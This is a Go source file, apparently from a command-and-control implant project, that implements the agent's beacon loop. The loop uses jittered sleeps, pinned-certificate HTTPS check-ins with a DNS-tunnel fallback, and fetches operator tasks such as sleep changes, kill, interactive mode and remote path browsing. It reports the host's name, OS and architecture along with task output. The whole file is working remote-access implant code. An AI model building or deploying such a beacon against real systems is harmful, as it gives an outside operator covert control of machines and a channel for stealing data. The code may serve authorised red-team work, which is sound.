package agent

import (
	"log"
	"math/rand"
	"os"
	"runtime"
	"strconv"
	"sync/atomic"
	"time"

	"github.com/aelder202/sable/internal/protocol"
)

// interactiveMode is set to 1 by the "interactive start" task so the beacon
// loop polls at the fast interval instead of the configured sleep interval.
var interactiveMode int32

// pathBrowseFastUntil stores a unix-nano deadline used to keep remote path
// browsing responsive after the operator opens the path browser.
var pathBrowseFastUntil int64

const (
	fastBeaconInterval   = 100 * time.Millisecond
	pathBrowseFastWindow = 2 * time.Minute
	failureLogInterval   = time.Minute
)

var (
	beaconNonceFn     = protocol.RandomNonce
	sendBeaconHTTPSFn = sendBeaconHTTPS
	sendBeaconDNSFn   = sendBeaconDNS
)

// Run starts the beacon loop. It blocks until a kill task is received or the process exits.
func Run(cfg *Config) {
	client := newPinnedClient(cfg.CertFingerprint)
	var lastResult *protocol.TaskResult
	consecutiveFailures := 0
	var lastFailureLog time.Time
	skipSleep := false

	for {
		// Skip the sleep when we have a fresh result to deliver, so the output
		// reaches the server on the very next beacon rather than after a full
		// sleep cycle. Normal idle beacons still sleep as configured.
		if !skipSleep {
			if fastBeaconActive() {
				time.Sleep(fastBeaconInterval)
			} else {
				base := time.Duration(cfg.SleepSeconds) * time.Second
				jitter := time.Duration(rand.Int63n(int64(base / 5))) //nolint:gosec — jitter doesn't need crypto rand
				time.Sleep(base + jitter)
			}
		}
		skipSleep = false

		nonce, err := beaconNonceFn()
		if err != nil {
			continue
		}

		pendingResult := lastResult
		beacon := &protocol.Beacon{
			AgentID:    cfg.AgentID,
			Timestamp:  time.Now().Unix(),
			Nonce:      nonce,
			Hostname:   hostname(),
			OS:         runtime.GOOS,
			Arch:       runtime.GOARCH,
			TaskOutput: pendingResult,
		}

		encoded, err := protocol.EncodeBeacon(beacon, cfg.Secret)
		if err != nil {
			continue
		}

		respBytes, err := sendBeaconHTTPSFn(client, cfg.ServerURL, encoded)
		if err != nil {
			if cfg.DNSDomain != "" {
				respBytes, err = sendBeaconDNSFn(encoded, cfg.DNSDomain)
				if err != nil {
					consecutiveFailures++
					suspendPathBrowseOnFailure()
					logBeaconFailure("beacon failed (https+dns)", err, consecutiveFailures, &lastFailureLog)
					continue
				}
			} else {
				consecutiveFailures++
				suspendPathBrowseOnFailure()
				logBeaconFailure("beacon failed", err, consecutiveFailures, &lastFailureLog)
				continue
			}
		}
		if consecutiveFailures > 0 {
			log.Printf("beacon recovered after %d failed attempt(s)", consecutiveFailures)
			consecutiveFailures = 0
			lastFailureLog = time.Time{}
		}

		// Only clear the pending result after the server has acknowledged the beacon.
		// This preserves the audit trail across transient transport failures.
		lastResult = nil

		task, err := protocol.DecodeTask(respBytes, cfg.Secret)
		if err != nil || task.Type == "noop" {
			continue
		}

		if task.Type == "sleep" {
			if secs, err := strconv.Atoi(task.Payload); err == nil && secs > 0 {
				cfg.SleepSeconds = secs
			}
			continue
		}

		result := executeTask(task)
		lastResult = result

		if task.Type == "kill" {
			return
		}

		// Deliver the result on the next beacon without sleeping first.
		skipSleep = true
	}
}

func hostname() string {
	h, _ := os.Hostname()
	return h
}

func fastBeaconActive() bool {
	if atomic.LoadInt32(&interactiveMode) == 1 {
		return true
	}
	return pathBrowseFastActive()
}

func pathBrowseFastActive() bool {
	deadline := atomic.LoadInt64(&pathBrowseFastUntil)
	return deadline > 0 && time.Now().Before(time.Unix(0, deadline))
}

func extendPathBrowseFastWindow() {
	atomic.StoreInt64(&pathBrowseFastUntil, time.Now().Add(pathBrowseFastWindow).UnixNano())
}

func stopPathBrowseFastWindow() {
	atomic.StoreInt64(&pathBrowseFastUntil, 0)
}

func suspendPathBrowseOnFailure() {
	if atomic.LoadInt32(&interactiveMode) == 0 && pathBrowseFastActive() {
		stopPathBrowseFastWindow()
	}
}

func logBeaconFailure(prefix string, err error, failures int, lastLog *time.Time) {
	now := time.Now()
	if failures == 1 {
		log.Printf("%s: %v", prefix, err)
		*lastLog = now
		return
	}
	if now.Sub(*lastLog) >= failureLogInterval {
		log.Printf("%s; still failing after %d attempts: %v", prefix, failures, err)
		*lastLog = now
	}
}
